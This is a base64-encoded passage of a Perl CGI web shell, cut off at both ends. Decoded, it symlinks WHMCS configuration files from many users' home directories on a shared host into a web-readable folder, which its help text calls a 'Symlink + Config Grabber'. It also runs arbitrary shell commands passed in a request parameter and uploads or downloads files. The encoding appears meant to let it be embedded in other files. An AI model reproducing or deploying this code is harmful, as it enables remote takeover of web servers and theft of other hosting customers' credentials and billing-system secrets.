NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NBUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09SREVSL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVEFSRUEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JVWS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01BTkFHRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFNVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcGFuZWwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSApOyBmb3JlYWNoIChAYXJyYXkpeyBteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9OyBteSAkdHlwZWNvbmZpZyA9ICRfLT57dHlwZX07IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsgbWtkaXIgInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNCI7IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQvcHBxLnR4dCIpOyBjb3B5KCJzeW1saW5rX2NvbmZpZy9uZW11LnR4dCIsInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8uaHRhY2Nlc3MiKSA7IH0gfSBwcmludCAic3VjY2VzcyI7DQp9DQpzdWIgSGVscA0Kew0KcHJpbnQgIjxjb2RlPiBIb3cgVG8gVXNlciBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI/IEp1c3QgS2xpayBTeW1saW5rICsgQ29uZmlnIEdyYWJiZXI8YnI+IjsNCnByaW50ICIgVGhlbiBDaGVjayBEaXJzIEJ5IEVudGVyIFRoZSBVUkw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZzxicj4iOw0KcHJpbnQgIiBGb3IgU3ltbGluayBKdXN0IEFkZCBJbiBVcmw8YnI+IjsNCnByaW50ICIgRXhhbXBsZTogc2l0ZS5jb20vY2dpZGlycy9zeW1saW5rX2NvbmZpZy9yb290LzwvY29kZT4iOw0KfQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQpsb2NhbCgkU2VuZEZpbGUpID0gQF87DQppZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQp7DQppZigkV2luTlQpDQp7DQpiaW5tb2RlKFNFTkRGSUxFKTsNCmJpbm1vZGUoU1RET1VUKTsNCn0NCiRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gbSEoW14vXlxcXSopJCE7DQpwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQpwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCnByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQpjbG9zZShTRU5ERklMRSk7DQp9DQplbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQooISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCnsNCiRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCn0NCmVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQp7DQpjaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCn0NCg0KaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCnsNCiZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQp9DQplbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0Kew0KJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQp9DQp9DQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiPC9jb2RlPiI7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQoNCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCmlmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCiZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQ